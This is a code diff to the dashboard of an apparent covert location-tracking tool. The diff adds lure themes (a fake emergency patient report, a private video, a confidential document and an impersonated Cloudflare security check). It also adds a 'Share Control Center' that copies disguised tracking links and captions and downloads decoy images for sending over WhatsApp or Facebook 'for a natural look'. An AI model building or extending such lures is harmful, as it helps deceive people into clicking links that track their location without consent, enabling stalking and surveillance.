@@ -4,7 +4,7 @@ import { getSession } from '../services/api';
 import { MapContainer, TileLayer, Marker, Popup, useMap, Circle } from 'react-leaflet';
 import L from 'leaflet';
 import io from 'socket.io-client';
-import { Map as MapIcon, Users, Clock, Navigation, AlertCircle, Copy, Check, Trash2, Bell, BellOff } from 'lucide-react';
+import { Map as MapIcon, Users, Clock, Navigation, AlertCircle, Copy, Check, Trash2, Bell, BellOff, Share2, Download, Image as ImageIcon, ExternalLink } from 'lucide-react';
 import axios from 'axios';
 
 // Fix for Leaflet marker icon in Vite/React
@@ -93,6 +93,48 @@ const DashboardPage = () => {
         setTimeout(() => setCopied(false), 2000);
     };
 
+    const themes = [
+        { t: "⚠️ Emergency Update: Patient Status Report", d: "A secure medical report has been shared. Verify your browser to view vital signs.", i: "/previews/p0.jpg" },
+        { t: "🔒 Private Profile Request", d: "Someone has shared a private profile with you. Complete the security check to view.", i: "/previews/p1.jpg" },
+        { t: "🎥 Protected Private Video", d: "You have been invited to view a private video. Verify your connection to start playback.", i: "/previews/p2.jpg" },
+        { t: "📄 Scanned Document: Confidential", d: "A password-protected document has been shared. Please verify your identity to download.", i: "/previews/p3.jpg" },
+        { t: "🛡️ Browser Security Verification", d: "Cloudflare is verifying your connection before accessing the requested resource.", i: "/previews/p4.jpg" }
+    ];
+
+    const currentTheme = themes[session?.previewIndex || 0] || themes[0];
+    const apiBase = 'https://trackers-oplf.onrender.com';
+    const smartLink = `${apiBase}/v/${sessionId}`;
+
+    const copySmartLink = () => {
+        navigator.clipboard.writeText(smartLink);
+        setCopied(true);
+        setTimeout(() => setCopied(false), 2000);
+    };
+
+    const copyCaptionLink = () => {
+        const caption = `${currentTheme.t}\n\n${currentTheme.d}\n\nView here: ${smartLink}`;
+        navigator.clipboard.writeText(caption);
+        setCopied(true);
+        setTimeout(() => setCopied(false), 2000);
+    };
+
+    const downloadPreview = async () => {
+        try {
+            const response = await fetch(`${apiBase}${currentTheme.i}`);
+            const blob = await response.blob();
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `preview_${sessionId}.jpg`;
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url);
+            document.body.removeChild(a);
+        } catch (err) {
+            alert('Failed to download image');
+        }
+    };
+
     const handleDelete = async () => {
         if (window.confirm('Are you sure you want to delete this session and all its data? This cannot be undone.')) {
             try {
@@ -160,11 +202,11 @@ const DashboardPage = () => {
                     </button>
                     
                     <button 
-                        onClick={copyLink}
-                        className="flex items-center gap-2 px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold rounded-lg transition-all border border-slate-700"
+                        onClick={copySmartLink}
+                        className="flex items-center gap-2 px-4 py-2 bg-blue-600 hover:bg-blue-500 text-xs font-bold rounded-lg transition-all shadow-lg shadow-blue-900/20 text-white"
                     >
-                        {copied ? <Check size={14} className="text-green-400" /> : <Copy size={14} />}
-                        {copied ? 'Copied' : 'Share Link'}
+                        {copied ? <Check size={14} /> : <Share2 size={14} />}
+                        {copied ? 'Copied' : 'Smart Link'}
                     </button>
 
                     <div className="h-6 w-px bg-slate-800 mx-2"></div>
@@ -228,6 +270,68 @@ const DashboardPage = () => {
                                 <p className="text-[10px] uppercase font-bold tracking-widest">Awaiting Signal...</p>
                             </div>
                         )}
+                    </div>
+
+                    {/* Share Control Center */}
+                    <div className="bg-slate-900 border border-slate-800 p-5 rounded-2xl shadow-xl">
+                        <h3 className="text-[10px] font-black text-slate-500 uppercase tracking-[0.2em] mb-4 flex items-center gap-2">
+                            <Share2 size={14} className="text-blue-500" /> Share Control Center
+                        </h3>
+                        
+                        <div className="space-y-4">
+                            {/* Smart Link Option */}
+                            <div className="p-4 bg-slate-800/50 border border-slate-700 rounded-xl">
+                                <div className="flex items-center justify-between mb-2">
+                                    <span className="text-[9px] uppercase font-black text-blue-400">Option 1: Smart Link</span>
+                                    <ExternalLink size={12} className="text-slate-600" />
+                                </div>
+                                <p className="text-[10px] text-slate-400 mb-3 leading-relaxed">
+                                    Best for WhatsApp/FB. Shows a clickable photo card automatically.
+                                </p>
+                                <button 
+                                    onClick={copySmartLink}
+                                    className="w-full py-2 bg-blue-600 hover:bg-blue-500 text-white text-[10px] font-bold rounded-lg transition-all flex items-center justify-center gap-2"
+                                >
+                                    <Copy size={12} /> Copy Smart Link
+                                </button>
+                            </div>
+
+                            {/* Photo + Caption Option */}
+                            <div className="p-4 bg-slate-800/50 border border-slate-700 rounded-xl">
+                                <div className="flex items-center justify-between mb-2">
+                                    <span className="text-[9px] uppercase font-black text-amber-400">Option 2: Photo + Caption</span>
+                                    <ImageIcon size={12} className="text-slate-600" />
+                                </div>
+                                
+                                <div className="relative aspect-video bg-black rounded-lg mb-3 overflow-hidden border border-slate-700">
+                                    <img 
+                                        src={`${apiBase}${currentTheme.i}`} 
+                                        alt="Preview" 
+                                        className="w-full h-full object-cover opacity-60"
+                                    />
+                                    <div className="absolute inset-0 flex items-center justify-center">
+                                        <button 
+                                            onClick={downloadPreview}
+                                            className="p-2 bg-black/60 hover:bg-black/80 rounded-full text-white backdrop-blur-sm transition-all"
+                                            title="Download Image"
+                                        >
+                                            <Download size={16} />
+                                        </button>
+                                    </div>
+                                </div>
+
+                                <p className="text-[10px] text-slate-400 mb-3 leading-relaxed italic">
+                                    "Download image and send it with the caption below for a natural look."
+                                </p>
+                                
+                                <button 
+                                    onClick={copyCaptionLink}
+                                    className="w-full py-2 bg-slate-700 hover:bg-slate-600 text-white text-[10px] font-bold rounded-lg transition-all flex items-center justify-center gap-2"
+                                >
+                                    <Copy size={12} /> Copy Caption Link
+                                </button>
+                            </div>
+                        </div>
                     </div>
 
                     {/* Stats Card */}
